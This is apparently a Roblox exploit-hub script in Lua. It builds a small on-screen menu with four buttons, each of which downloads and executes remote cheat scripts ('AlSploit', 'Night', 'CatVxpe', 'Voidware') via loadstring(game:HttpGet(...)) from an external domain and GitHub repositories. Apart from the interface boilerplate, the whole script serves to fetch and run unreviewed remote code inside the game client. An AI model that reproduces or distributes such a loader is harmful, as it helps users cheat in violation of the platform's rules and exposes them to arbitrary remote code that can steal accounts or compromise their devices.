task.delay(10, function()
    --// Create ScreenGui
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = game:GetService("CoreGui")

    --// Create main frame
    local Frame = Instance.new("Frame")
    Frame.Size = UDim2.new(0, 250, 0, 200)
    Frame.Position = UDim2.new(0.5, -125, 0.5, -100)
    Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    Frame.BorderSizePixel = 0
    Frame.Parent = ScreenGui

    --// UICorner
    local UICorner = Instance.new("UICorner")
    UICorner.CornerRadius = UDim.new(0, 12)
    UICorner.Parent = Frame

    --// UIListLayout
    local UIListLayout = Instance.new("UIListLayout")
    UIListLayout.Parent = Frame
    UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
    UIListLayout.Padding = UDim.new(0, 6)

    --// Utility function to make buttons
    local function createButton(text, callback)
        local button = Instance.new("TextButton")
        button.Size = UDim2.new(1, -12, 0, 35)
        button.Position = UDim2.new(0, 6, 0, 0)
        button.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        button.TextColor3 = Color3.fromRGB(255, 255, 255)
        button.Font = Enum.Font.GothamBold
        button.TextSize = 14
        button.Text = text
        button.Parent = Frame

        local corner = Instance.new("UICorner")
        corner.CornerRadius = UDim.new(0, 8)
        corner.Parent = button

        button.MouseButton1Click:Connect(callback)
        return button
    end

    createButton("AlSploit", function()
        loadstring(game:HttpGet("https://r2.packetroblox.xyz/alsploit.lua", true))()
    end)

    createButton("Night", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/null-wtf/Night/refs/heads/main/Night/Loader.luau", true))()
    end)

    createButton("CatVxpe", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/new-qwertyui/CatV5/main/init.lua", true))()
    end)

    createButton("Voidware", function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/VapeVoidware/vapevoidware/main/NewMainScript.lua", true))()
    end)

    --// Close Button (X)
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeBtn.Font = Enum.Font.GothamBold
    closeBtn.TextSize = 16
    closeBtn.Text = "X"
    closeBtn.Parent = Frame

    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 8)
    closeCorner.Parent = closeBtn

    closeBtn.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
end)
